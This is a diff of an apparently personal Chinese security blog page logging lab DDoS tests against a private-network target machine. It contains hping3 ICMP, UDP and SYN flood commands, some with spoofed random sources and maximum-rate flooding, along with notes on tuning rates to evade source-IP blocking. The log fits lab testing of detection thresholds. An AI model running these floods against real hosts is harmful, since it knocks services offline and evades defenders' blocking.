@@ -1,101 +1,1640 @@
-<!doctype html><html lang=en dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='2026.04.03 DDos攻击测试记录## 流量检测手段： sudo apt update && sudo apt install nload nload eth0 ip -s -s link show eth0 watch -n 1 -d "ip -s link show eth0"一、ICMP DDos攻击#16:20~16:22
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="2026.04.03 DDos攻击测试记录## 流量检测手段： sudo apt update &amp;&amp; sudo apt install nload nload eth0 ip -s -s link show eth0 watch -n 1 -d &#34;ip -s link show eth0&#34;一、ICMP DDos攻击#16:20~16:22
 # 【低等级】不伪造源，约发 3000 pps。 16:20 sudo hping3 --icmp -c 100000 -d 64 -i u400 172.31.132.2 # 【中等级】伪造源IP绕过源封锁，约发 6600 pps。 16:21 sudo hping3 --icmp -c 100000 -d 64 -i u150 --rand-source 172.31.132.2 # 【强等级】伪造源IP，极限泛洪。 16：22 sudo timeout 8s hping3 --icmp -d 64 --flood --rand-source 172.31.132.2二、UDP DDos攻击#16:23~16:25
-'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#2e3440"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://vnccer.github.io/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/"><meta property="og:site_name" content="vnccer"><meta property="og:title" content="DDos攻击测试日志"><meta property="og:description" content='2026.04.03 DDos攻击测试记录## 流量检测手段： sudo apt update && sudo apt install nload nload eth0 ip -s -s link show eth0 watch -n 1 -d "ip -s link show eth0"一、ICMP DDos攻击#16:20~16:22
-# 【低等级】不伪造源，约发 3000 pps。 16:20 sudo hping3 --icmp -c 100000 -d 64 -i u400 172.31.132.2 # 【中等级】伪造源IP绕过源封锁，约发 6600 pps。 16:21 sudo hping3 --icmp -c 100000 -d 64 -i u150 --rand-source 172.31.132.2 # 【强等级】伪造源IP，极限泛洪。 16：22 sudo timeout 8s hping3 --icmp -d 64 --flood --rand-source 172.31.132.2二、UDP DDos攻击#16:23~16:25'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-04-15T00:00:00+00:00"><meta property="article:modified_time" content="2026-04-15T00:00:00+00:00"><meta itemprop=name content="DDos攻击测试日志"><meta itemprop=description content='2026.04.03 DDos攻击测试记录## 流量检测手段： sudo apt update && sudo apt install nload nload eth0 ip -s -s link show eth0 watch -n 1 -d "ip -s link show eth0"一、ICMP DDos攻击#16:20~16:22
-# 【低等级】不伪造源，约发 3000 pps。 16:20 sudo hping3 --icmp -c 100000 -d 64 -i u400 172.31.132.2 # 【中等级】伪造源IP绕过源封锁，约发 6600 pps。 16:21 sudo hping3 --icmp -c 100000 -d 64 -i u150 --rand-source 172.31.132.2 # 【强等级】伪造源IP，极限泛洪。 16：22 sudo timeout 8s hping3 --icmp -d 64 --flood --rand-source 172.31.132.2二、UDP DDos攻击#16:23~16:25'><meta itemprop=datePublished content="2026-04-15T00:00:00+00:00"><meta itemprop=dateModified content="2026-04-15T00:00:00+00:00"><meta itemprop=wordCount content="1279"><title>DDos攻击测试日志 | vnccer</title><link rel=icon href=/ak47.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://vnccer.github.io/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/><link rel=stylesheet href=/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.2f97d07853187a58b0d1c6f7546609fafa25e2267d955fa61f4874dde374b8b7.js integrity="sha256-L5fQeFMYeliw0cb3VGYJ+vol4iZ9lV+mH0h03eN0uLc=" crossorigin=anonymous></script><script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]],processEscapes:!0,processEnvironments:!0},options:{skipHtmlTags:["script","noscript","style","textarea","pre"]}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/flamez.png alt=Logo><span>vnccer</span></a></h2><div class="book-search hidden"><input id=book-search-input type=text placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c860f18c28389564163849da32ed5d14 class=toggle>
-<label for=section-c860f18c28389564163849da32ed5d14 class=flex><a role=button>Project</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/project/vigil/>vigil</a></li><li><a href=/docs/project/vigil-abandoned-version/>vigil(abandoned version)</a></li></ul></li><li><input type=checkbox id=section-8d58ff5c5e366ab14339daed9d222b7f class=toggle checked>
-<label for=section-8d58ff5c5e366ab14339daed9d222b7f class=flex><a href=/docs/cybersecurity/>网安</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-ad627e53d6d1828a1435a85961eea27f class=toggle checked>
-<label for=section-ad627e53d6d1828a1435a85961eea27f class=flex><a role=button>xnwlaqbc靶机记录</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/>xnwlaqbc靶机部署与攻击</a></li><li><a href=/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/ class=active>DDos攻击测试日志</a></li></ul></li><li><input type=checkbox id=section-20b418ba6aa317c76a5b35dea36ccbca class=toggle>
-<label for=section-20b418ba6aa317c76a5b35dea36ccbca class=flex><a href=/docs/cybersecurity/DVWA/>DVWA</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/DVWA/dvwa%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BF%AE%E5%A4%8D/>dvwa初始化修复</a></li><li><a href=/docs/cybersecurity/DVWA/Authorisation-Bypass/>Authorisation Bypass</a></li><li><a href=/docs/cybersecurity/DVWA/CSRF/>CSRF</a></li><li><a href=/docs/cybersecurity/DVWA/Open-HTTP-Redirect/>Open HTTP Redirect</a></li><li><a href=/docs/cybersecurity/DVWA/API/>api</a></li><li><a href=/docs/cybersecurity/DVWA/CSP-Bypass/>CSP Bypass</a></li><li><a href=/docs/cybersecurity/DVWA/Cyptography/>Cryptography</a></li><li><a href=/docs/cybersecurity/DVWA/Command-Injection/>Command Injection</a></li><li><a href=/docs/cybersecurity/DVWA/File-Inclusion/>File Inclusion</a></li><li><a href=/docs/cybersecurity/DVWA/SQL-Injection/>SQL Injection</a></li></ul></li><li><a href=/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/>kali_linux基操</a></li><li><input type=checkbox id=section-aa6f3e63fd33f2e9fa1487b55c3551ba class=toggle>
-<label for=section-aa6f3e63fd33f2e9fa1487b55c3551ba class=flex><a role=button>SRC</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/SRC/stepfun/>漏洞盒子：阶跃星辰安全应急响应中心</a></li></ul></li><li><input type=checkbox id=section-4ae5ffa90962cdf2660fe74526a01436 class=toggle>
-<label for=section-4ae5ffa90962cdf2660fe74526a01436 class=flex><a role=button>Vulnerabilities</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/>基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a></li></ul></li><li><input type=checkbox id=section-e003e03c1feb2b65c7b35f539ae39c73 class=toggle>
-<label for=section-e003e03c1feb2b65c7b35f539ae39c73 class=flex><a role=button>VULNHUB</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-ac34f5c7f66ad3765e4c61f98a3f46fd class=toggle>
-<label for=section-ac34f5c7f66ad3765e4c61f98a3f46fd class=flex><a role=button>easy</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_drippingblues/>drippingblues</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/>doubletrouble: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/>Beelzebub: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/>Empire Breakout</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/>ICA: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/>jangow 1.0.1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/>Napping: 1.0.1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Noob_1/>Noob: 1</a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_The-planets_earth/>The planets earth</a></li></ul></li><li><input type=checkbox id=section-ad44293ee93b1d26cf7c58190e7d4815 class=toggle>
-<label for=section-ad44293ee93b1d26cf7c58190e7d4815 class=flex><a role=button>medium</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/>Corrosion: 2</a></li><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/>Thales</a></li><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/>Empire lupinone</a></li></ul></li><li><input type=checkbox id=section-fb378fb748ece0ae1fdeedef24da3db6 class=toggle>
-<label for=section-fb378fb748ece0ae1fdeedef24da3db6 class=flex><a role=button>hard</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/hard/vulnhub_Matrix-Breakout_-2_Morpheus/>Matrix-Breakout: 2 Morpheus</a></li></ul></li></ul></li><li><input type=checkbox id=section-5b607fcbb0b7c699a3da0e65a2ffed9b class=toggle>
-<label for=section-5b607fcbb0b7c699a3da0e65a2ffed9b class=flex><a role=button>CTF</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-7a6315a3240f7682f305097cdf53ea82 class=toggle>
-<label for=section-7a6315a3240f7682f305097cdf53ea82 class=flex><a role=button>easy</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/CTF/easy/CTF-web-low/>web-low</a></li></ul></li><li><input type=checkbox id=section-f08add9f101710f9ba3d484a35d5581b class=toggle>
-<label for=section-f08add9f101710f9ba3d484a35d5581b class=flex><a role=button>medium</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-1fdf586d1ea5885edf0672ce206f530c class=toggle>
-<label for=section-1fdf586d1ea5885edf0672ce206f530c class=flex><a role=button>hard</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li></ul></li><li><input type=checkbox id=section-94ed7c835fd2d66c69e86ff967d092f9 class=toggle>
-<label for=section-94ed7c835fd2d66c69e86ff967d092f9 class=flex><a href=/docs/papers/>论文</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/papers/%E5%9F%BA%E4%BA%8E%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%8F%E5%88%97%E7%9A%84%E6%81%B6%E6%84%8F%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/>基于可变长序列的恶意加密流量检测方法</a></li><li><a href=/docs/papers/ET-BERT/>ET-BERT</a></li><li><a href=/docs/papers/ET-BERT%E5%A4%8D%E7%8E%B0/>ET-BERT复现</a></li><li><a href=/docs/papers/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%9F%BA%E7%A1%80/>加密流量基础</a></li><li><a href=/docs/papers/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/>数据集分析</a></li></ul></li><li><input type=checkbox id=section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed class=toggle>
-<label for=section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed class=flex><a role=button>工作</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/AI%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/>AI安全思考</a></li><li><input type=checkbox id=section-2c262361fe9aa48cd5d939ca8724680d class=toggle>
-<label for=section-2c262361fe9aa48cd5d939ca8724680d class=flex><a role=button>leetcode</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-c1a97b113c65b26353860b399a4f8855 class=toggle>
-<label for=section-c1a97b113c65b26353860b399a4f8855 class=flex><a role=button>哈希</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/leetcode/1.%E5%93%88%E5%B8%8C/1.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/>1.两数之和</a></li></ul></li></ul></li><li><a href=/docs/work/%E5%AE%9E%E4%B9%A0%E7%AE%80%E5%8E%86/>实习简历</a></li></ul></li><li><input type=checkbox id=section-8ebb29a2ddfb039e11169448c9cf3620 class=toggle>
-<label for=section-8ebb29a2ddfb039e11169448c9cf3620 class=flex><a href=/docs/skills/>技能</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/skills/Hugo%E6%9E%B6%E6%9E%84%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/>Hugo架构网站搭建指南</a></li><li><a href=/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/>anaconda环境配置</a></li><li><a href=/docs/skills/linux-clash%E9%83%A8%E7%BD%B2/>linux clash部署</a></li><li><a href=/docs/skills/pyenv%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/>pyenv管理python版本</a></li><li><a href=/docs/skills/SwitchyOmega_mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/>SwitchyOmega_mv3操作记录</a></li><li><a href=/docs/skills/win+r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/>win+r常用指令</a></li><li><a href=/docs/skills/windows%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86/>windows终端/git 走代理</a></li><li><a href=/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali_linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/>基于vmware的kali_linux下的docker部署(坑多)</a></li></ul></li><li><input type=checkbox id=section-d096fa83268a84183f67ef634318f12c class=toggle>
-<label for=section-d096fa83268a84183f67ef634318f12c class=flex><a href=/docs/AI/>AI</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/AI/claude-code-cli/>claude code cli</a></li><li><a href=/docs/AI/%E4%B8%BB%E6%B5%81AI%E5%AE%9A%E4%BB%B7/>主流AI定价</a></li></ul></li><li><input type=checkbox id=section-854542c26bded6389f67b522f4182c5e class=toggle>
-<label for=section-854542c26bded6389f67b522f4182c5e class=flex><a role=button>导航门户</a>
-<img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/navigation/%E7%BD%91%E5%AE%89/>网安</a></li><li><a href=/docs/navigation/%E8%AE%BA%E6%96%87/>论文</a></li><li><a href=/docs/navigation/%E5%B7%A5%E4%BD%9C/>工作</a></li><li><a href=/docs/navigation/Function/>Function</a></li><li><a href=/docs/navigation/AI/>AI</a></li><li><a href=/docs/navigation/Life/>Life</a></li><li><a href=/docs/navigation/%E5%B9%B3%E5%8F%B0/>平台</a></li><li><a href=/docs/navigation/%E6%9C%BA%E5%9C%BA/>机场</a></li></ul></li></ul><ul><li><a href=/posts/ title=Blog>Blog</a></li><li><a href=https://github.com/vnccer target=_blank rel=noopener>Github</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class="book-header hidden"><div class="flex align-center justify-between"><label for=menu-control><img src=/icons/menu.svg class=book-icon alt=Menu></label><h3>DDos攻击测试日志</h3><label for=toc-control><img src=/icons/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class=hidden><nav id=TableOfContents><ul><li><a href=#20260403-ddos攻击测试记录>2026.04.03 DDos攻击测试记录</a><ul><li><a href=#一icmp-ddos攻击>一、ICMP DDos攻击</a></li><li><a href=#二udp-ddos攻击>二、UDP DDos攻击</a></li><li><a href=#三tcp-syn-ddos攻击>三、TCP Syn DDos攻击</a></li><li><a href=#四思路调试>四、思路调试</a></li></ul></li><li><a href=#410思路>4.10思路</a></li><li><a href=#单ip攻击>单ip攻击</a></li><li><a href=#随机源ip攻击>随机源ip攻击</a></li><li><a href=#udp组攻击一三组-d速度统一u100->UDP组攻击一：三组-d，速度统一，u100 =</a></li><li><a href=#udp组攻击二极限速度>UDP组攻击二：极限速度</a></li><li><a href=#udp组攻击三单ip攻击>UDP组攻击三：单IP攻击</a><ul><li><a href=#二慢dos桥接防火墙关闭失败>二、慢dos（桥接+防火墙关闭）（失败）</a></li></ul></li><li><a href=#414慢速ddos>4.14慢速Ddos</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=20260403-ddos攻击测试记录>2026.04.03 DDos攻击测试记录<a class=anchor href=#20260403-ddos%e6%94%bb%e5%87%bb%e6%b5%8b%e8%af%95%e8%ae%b0%e5%bd%95>#</a></h1><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span><span style=color:#78787e># 流量检测手段：</span>
-</span></span><span style=display:flex><span>sudo apt update <span style=color:#ff6ac1>&amp;&amp;</span> sudo apt install nload
-</span></span><span style=display:flex><span>nload eth0
-</span></span><span style=display:flex><span>ip -s -s link show eth0
-</span></span><span style=display:flex><span>watch -n <span style=color:#ff9f43>1</span> -d <span style=color:#5af78e>&#34;ip -s link show eth0&#34;</span></span></span></code></pre></div><h2 id=一icmp-ddos攻击>一、ICMP DDos攻击<a class=anchor href=#%e4%b8%80icmp-ddos%e6%94%bb%e5%87%bb>#</a></h2><p><code>16:20</code>~<code>16:22</code></p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span><span style=color:#78787e># 【低等级】不伪造源，约发 3000 pps。 16:20</span>
-</span></span><span style=display:flex><span>sudo hping3 --icmp -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>64</span> -i u400 172.31.132.2
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#78787e># 【中等级】伪造源IP绕过源封锁，约发 6600 pps。 16:21</span>
-</span></span><span style=display:flex><span>sudo hping3 --icmp -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>64</span> -i u150 --rand-source 172.31.132.2
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#78787e># 【强等级】伪造源IP，极限泛洪。 16：22</span>
-</span></span><span style=display:flex><span>sudo timeout 8s hping3 --icmp -d <span style=color:#ff9f43>64</span> --flood --rand-source 172.31.132.2</span></span></code></pre></div><h2 id=二udp-ddos攻击>二、UDP DDos攻击<a class=anchor href=#%e4%ba%8cudp-ddos%e6%94%bb%e5%87%bb>#</a></h2><p><code>16:23</code>~<code>16:25</code></p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span><span style=color:#78787e># 【低等级】不伪造源，约发 3000 pps。 16:23</span>
-</span></span><span style=display:flex><span>sudo hping3 --udp -p <span style=color:#ff9f43>8080</span> -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>64</span> -i u333 172.31.132.2
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#78787e># 【中等级】伪造源，约发50000pps。 16:24</span>
-</span></span><span style=display:flex><span>sudo hping3 --udp -p <span style=color:#ff9f43>8080</span> -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>64</span> -i u20 --rand-source 172.31.132.2
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#78787e># 【强等级】伪造源，极限泛洪。 16:25</span>
-</span></span><span style=display:flex><span><span style=color:#78787e># 如果此条仍未触发报警，说明单台攻击机性能达不到10万pps，需开启多个终端同时运行此命令。</span>
-</span></span><span style=display:flex><span>sudo timeout 8s hping3 --udp -p <span style=color:#ff9f43>8080</span> -d <span style=color:#ff9f43>64</span> --flood --rand-source 172.31.132.2</span></span></code></pre></div><h2 id=三tcp-syn-ddos攻击>三、TCP Syn DDos攻击<a class=anchor href=#%e4%b8%89tcp-syn-ddos%e6%94%bb%e5%87%bb>#</a></h2><p><code>16:26</code>~<code>16:28</code></p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span><span style=color:#78787e># 【低等级】伪造源。约发 6600 pps。 16:26</span>
-</span></span><span style=display:flex><span>sudo hping3 -S -p <span style=color:#ff9f43>8080</span> -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>0</span> -i u150 --rand-source 172.31.132.2
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#78787e># 【中等级】伪造源。约发 15000 pps。 16:27</span>
-</span></span><span style=display:flex><span>sudo hping3 -S -p <span style=color:#ff9f43>8080</span> -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>0</span> -i u66 --rand-source 172.31.132.2
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#78787e># 【强等级】伪造源，极限泛洪。 16:28</span>
-</span></span><span style=display:flex><span>sudo timeout 8s hping3 -S -p <span style=color:#ff9f43>8080</span> -d <span style=color:#ff9f43>0</span> --flood --rand-source 172.31.132.2</span></span></code></pre></div><h2 id=四思路调试>四、思路调试<a class=anchor href=#%e5%9b%9b%e6%80%9d%e8%b7%af%e8%b0%83%e8%af%95>#</a></h2><p>第一组：除了ICMP采用随机源ip，其余全部低于源ip封锁阈值</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>sudo hping3 --udp -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>1400</span> -i u550 -p <span style=color:#ff9f43>8080</span> 172.31.132.2 <span style=color:#78787e># 1818 packet/s</span>
-</span></span><span style=display:flex><span>sudo hping3 -S -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>1400</span> -i u160 --rand-source -p <span style=color:#ff9f43>8080</span> 172.31.132.2 <span style=color:#78787e># 6250 packet/s</span>
-</span></span><span style=display:flex><span>sudo hping3 --icmp -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>1400</span> -i u550 172.31.132.2 <span style=color:#78787e># 1818 packet/s</span></span></span></code></pre></div><p>第二组：降低包大小为800</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>sudo hping3 --udp -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>800</span> -i u550 -p <span style=color:#ff9f43>8080</span> 172.31.132.2 <span style=color:#78787e># 1818 packet/s</span>
-</span></span><span style=display:flex><span>sudo hping3 -S -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>800</span> -i u160 --rand-source -p <span style=color:#ff9f43>8080</span> 172.31.132.2 <span style=color:#78787e># 6250 packet/s</span>
-</span></span><span style=display:flex><span>sudo hping3 --icmp -c <span style=color:#ff9f43>100000</span> -d <span style=color:#ff9f43>800</span> -i u550 172.31.132.2 <span style=color:#78787e># 1818 packet/s</span></span></span></code></pre></div><p>第三组：增加udp和icmp采用rand-source，并减少包大小</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>sudo hping3 --udp -c <span style=color:#ff9f43>10000</span> -d <span style=color:#ff9f43>256</span> -i u200 --rand-source -p <span style=color:#ff9f43>8080</span> 172.31.132.2 <span style=color:#78787e># 5000 packet/s</span>
-</span></span><span style=display:flex><span>sudo hping3 -S -c <span style=color:#ff9f43>10000</span> -d <span style=color:#ff9f43>128</span> -i u80 --rand-source -p <span style=color:#ff9f43>8080</span> 172.31.132.2 <span style=color:#78787e># 12500 packet/s</span>
-</span></span><span style=display:flex><span>sudo hping3 --icmp -c <span style=color:#ff9f43>10000</span> -d <span style=color:#ff9f43>64</span> -i u200 --rand-source 172.31.132.2 <span style=color:#78787e># 5000 packet/s</span></span></span></code></pre></div><p>第四组：采用自己的ip攻击</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>sudo hping3 --udp -c <span style=color:#ff9f43>10000</span> -d <span style=color:#ff9f43>256</span> -i u200 -p <span style=color:#ff9f43>8080</span> 172.31.132.2
-</span></span><span style=display:flex><span>sudo hping3 -S -c <span style=color:#ff9f43>10000</span> -d <span style=color:#ff9f43>128</span> -i u80 -p <span style=color:#ff9f43>8080</span> 172.31.132.2
-</span></span><span style=display:flex><span>sudo hping3 --icmp -c <span style=color:#ff9f43>10000</span> -d <span style=color:#ff9f43>64</span> -i u200 172.31.132.2</span></span></code></pre></div><h1 id=410思路>4.10思路<a class=anchor href=#410%e6%80%9d%e8%b7%af>#</a></h1><p><strong>目标</strong>：</p><ol><li>触发源IP封锁</li><li>绕过源IP封锁，触发目的IP丢包</li></ol><div style=display:flex;justify-content:space-between><img src=images/1.png>
-<img src=images/2.png>
-<img src=images/3.png></div>```ZSH
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="DDos攻击测试日志">
+  <meta property="og:description" content="2026.04.03 DDos攻击测试记录## 流量检测手段： sudo apt update &amp;&amp; sudo apt install nload nload eth0 ip -s -s link show eth0 watch -n 1 -d &#34;ip -s link show eth0&#34;一、ICMP DDos攻击#16:20~16:22
+# 【低等级】不伪造源，约发 3000 pps。 16:20 sudo hping3 --icmp -c 100000 -d 64 -i u400 172.31.132.2 # 【中等级】伪造源IP绕过源封锁，约发 6600 pps。 16:21 sudo hping3 --icmp -c 100000 -d 64 -i u150 --rand-source 172.31.132.2 # 【强等级】伪造源IP，极限泛洪。 16：22 sudo timeout 8s hping3 --icmp -d 64 --flood --rand-source 172.31.132.2二、UDP DDos攻击#16:23~16:25">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2026-04-15T00:00:00+00:00">
